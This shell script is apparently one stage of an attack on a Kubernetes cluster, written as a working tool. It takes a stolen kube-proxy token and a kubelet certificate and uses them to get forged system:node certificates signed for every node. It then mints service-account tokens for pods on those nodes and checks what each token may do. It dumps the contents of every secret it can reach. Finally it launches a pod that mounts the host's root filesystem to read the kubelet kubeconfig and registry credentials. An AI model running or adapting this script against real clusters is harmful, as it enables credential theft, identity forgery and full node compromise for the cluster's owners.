#!/bin/sh
# i5831 phase 4: mint SA tokens with the correct per-node identity (node cert,
# not the CN=kubelet cert), then measure and use the strongest.
set -u
mkdir -p /out
A=https://kubernetes.default.svc
PT=$(cat /k/kube-proxy-token.txt)
echo "===Z0-BEGIN==="
SELF=$(curl -sS -m 8 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/name)
echo "[self:$SELF]"
curl -sS -m 12 -k -H "Authorization: Bearer $PT" "$A/api/v1/nodes" -o /out/nodes.json -w '[nodes:%{http_code}]'; echo
NODES=$(jq -r '.items[]?.metadata.name' /out/nodes.json 2>/dev/null)
[ -z "$NODES" ] && NODES="$SELF"
mkcsr() {
  N="$1"; TAG="$2"
  openssl req -new -newkey rsa:2048 -nodes -keyout /k/n-$TAG.key -out /k/n-$TAG.csr -subj "/CN=system:node:$N/O=system:nodes" 2>/dev/null
  REQ=$(base64 -w0 /k/n-$TAG.csr)
  jq -c -n --arg n "nc-$TAG-$RANDOM" --arg r "$REQ" --arg u "system:node:$N" '{apiVersion:"certificates.k8s.io/v1",kind:"CertificateSigningRequest",metadata:{name:$n},spec:{request:$r,signerName:"kubernetes.io/kube-apiserver-client-kubelet",usages:["digital signature","client auth"],username:$u}}' > /tmp/csr-$TAG.json
  NM=$(jq -r .metadata.name /tmp/csr-$TAG.json)
  curl -sS -m 12 -k --cacert /k/ca.crt --cert /k/kubelet.crt --key /k/kubelet.key -H 'Content-Type: application/json' -X POST --data-binary @/tmp/csr-$TAG.json "$A/apis/certificates.k8s.io/v1/certificatesigningrequests" -o /dev/null -w "[csr:$N:%{http_code}]"
  i=0
  while [ $i -lt 10 ]; do
    curl -sS -m 10 -k --cacert /k/ca.crt --cert /k/kubelet.crt --key /k/kubelet.key "$A/apis/certificates.k8s.io/v1/certificatesigningrequests/$NM" -o /tmp/csrg-$TAG.json
    CERT=$(jq -r '.status.certificate // empty' /tmp/csrg-$TAG.json 2>/dev/null)
    if [ -n "$CERT" ]; then echo "$CERT" | base64 -d > /k/n-$TAG.crt; echo " signed@$i"; break; fi
    i=$((i+1)); sleep 2
  done
}
for N in $NODES; do
  if [ "$N" = "$SELF" ]; then TAG=self; else TAG=$(echo "$N" | md5sum | cut -c1-6); fi
  mkcsr "$N" "$TAG"
  [ -s /k/n-$TAG.crt ] || { echo "-- nocert $N"; continue; }
  echo "-- NODECERT-$TAG-BEGIN"; base64 -w0 /k/n-$TAG.crt; echo; echo "-- NODECERT-$TAG-END"; echo "-- NODEKEY-$TAG-BEGIN"; base64 -w0 /k/n-$TAG.key; echo; echo "-- NODEKEY-$TAG-END"
  CC="--cacert /k/ca.crt --cert /k/n-$TAG.crt --key /k/n-$TAG.key"
  echo "-- whoami $N"; curl -sS -m 10 -k $CC -H 'Content-Type: application/json' -X POST -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}' "$A/apis/authentication.k8s.io/v1/selfsubjectreviews" | jq -c '.status.userInfo.username' 2>/dev/null
  curl -sS -m 15 -k $CC "$A/api/v1/pods?fieldSelector=spec.nodeName=$N" -o /out/pods-$TAG.json -w "[pods:$N:%{http_code}]"; echo
  jq -r '.items[]? | "\(.metadata.namespace)|\(.spec.serviceAccountName // "default")"' /out/pods-$TAG.json 2>/dev/null | sort -u > /out/sas-$TAG.txt
  echo "[sas:$N:$(wc -l < /out/sas-$TAG.txt)]"
done
ssar() { # tok ns res verb
  jq -c -n --arg r "$3" --arg v "$4" --arg n "$2" '{apiVersion:"authorization.k8s.io/v1",kind:"SelfSubjectAccessReview",spec:{resourceAttributes:{verb:$v,resource:$r,namespace:$n}}}' > /tmp/sar.json
  curl -sS -m 10 -k -H 'Content-Type: application/json' -H "Authorization: Bearer $1" -X POST --data-binary @/tmp/sar.json "$A/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" | jq -r '.status.allowed' 2>/dev/null
}
TOKF=/out/tokens.txt; : > $TOKF
for N in $NODES; do
  if [ "$N" = "$SELF" ]; then TAG=self; else TAG=$(echo "$N" | md5sum | cut -c1-6); fi
  [ -s /k/n-$TAG.crt ] || continue
  CC="--cacert /k/ca.crt --cert /k/n-$TAG.crt --key /k/n-$TAG.key"
  while IFS='|' read -r NS SA; do
    [ -z "$NS" ] && continue
    BODY=$(jq -c -n '{apiVersion:"authentication.k8s.io/v1",kind:"TokenRequest",spec:{audiences:["https://kubernetes.default.svc"]}}')
    R=$(curl -sS -m 10 -k $CC -H 'Content-Type: application/json' -X POST -d "$BODY" -w '\n[%{http_code}]' "$A/api/v1/namespaces/$NS/serviceaccounts/$SA/token")
    CODE=$(echo "$R" | tail -1)
    TK=$(echo "$R" | sed '$d' | jq -r '.status.token // empty' 2>/dev/null)
    if [ -z "$TK" ]; then echo "[tok:$N:$NS/$SA:$CODE:$(echo "$R"|sed '$d'|jq -r .message 2>/dev/null|head -c 120)]"; continue; fi
    S1=$(ssar "$TK" "$NS" secrets list); P1=$(ssar "$TK" "$NS" pods create); E1=$(ssar "$TK" "$NS" pods/exec create); L1=$(ssar "$TK" "$NS" pods/log create)
    echo "[tok:$N:$NS/$SA:ok:secrets=$S1:pods=$P1:exec=$E1:log=$L1]"
    echo "$NS|$SA|$S1|$P1|$E1|$L1|$TK" >> $TOKF
  done < /out/sas-$TAG.txt
done
echo "===Z0-END==="
echo "===Z1-BEGIN==="
cut -d'|' -f1,2,3,4 $TOKF | sort -u
echo "--- secrets per ns where allowed"
for NS in $(awk -F'|' '$3=="true"{print $1}' $TOKF | sort -u); do
  ROW=$(awk -F'|' -v n="$NS" '$1==n && $3=="true"{print; exit}' $TOKF)
  TK=$(echo "$ROW"|cut -d'|' -f7)
  echo "-- list-secrets:$NS"; curl -sS -m 12 -k -H "Authorization: Bearer $TK" "$A/api/v1/namespaces/$NS/secrets" -o /tmp/sec-$NS.json -w '[%{http_code}]'; echo
  for SN in $(jq -r '.items[]?.metadata.name' /tmp/sec-$NS.json 2>/dev/null); do
    echo "-- secret:$NS/$SN"
    curl -sS -m 10 -k -H "Authorization: Bearer $TK" "$A/api/v1/namespaces/$NS/secrets/$SN" | jq -c '{name:.metadata.name,data:.data}' 2>/dev/null | head -c 7000; echo
  done
done
echo "===Z1-END==="
echo "===Z2-BEGIN==="
BEST=$(awk -F'|' '$4=="true" && $6=="true" {print; exit}' $TOKF)
echo "[best:$BEST]"
if [ -n "$BEST" ]; then
  NS=$(echo "$BEST"|cut -d'|' -f1); TK=$(echo "$BEST"|cut -d'|' -f7)
  PN="hp-$RANDOM"
  SCRIPT='set -u; echo HOSTBEGIN; id; echo KUBECONFIG; cat /h/var/lib/kubelet/kubeconfig 2>/dev/null | head -c 6000; echo; echo DOCKERCFG; for f in /h/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/config.json /h/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/.dockerconfigjson; do echo "F:$f"; head -c 4000 "$f" 2>/dev/null; echo; done; echo HOSTEND'
  jq -c -n --arg n "$PN" --arg s "$SCRIPT" --arg nd "$SELF" '{apiVersion:"v1",kind:"Pod",metadata:{name:$n,namespace:"quantum"},spec:{nodeName:$nd,restartPolicy:"Never",containers:[{name:"d",image:"alpine:3.20",command:["sh","-c",$s],volumeMounts:[{name:"h",mountPath:"/h"}]}],volumes:[{name:"h",hostPath:{path:"/"}}]}}' > /tmp/hp.json
  echo "-- hostpod create $NS"; curl -sS -m 12 -k -H "Authorization: Bearer $TK" -H 'Content-Type: application/json' -X POST --data-binary @/tmp/hp.json "$A/api/v1/namespaces/$NS/pods" -w '\n[%{http_code}]' | head -c 400; echo
  i=0; L=""
  while [ $i -lt 25 ]; do
    sleep 3
    L=$(curl -sS -m 10 -k -H "Authorization: Bearer $TK" "$A/api/v1/namespaces/$NS/pods/$PN/log")
    echo "$L" | grep -q HOSTEND && break
    echo "$L" | grep -q 'not found' && [ $i -gt 2 ] && break
    i=$((i+1))
  done
  echo "-- hostpod log"; echo "$L" | head -c 14000; echo
fi
echo "===Z2-END==="
echo "===ALLDONE4==="
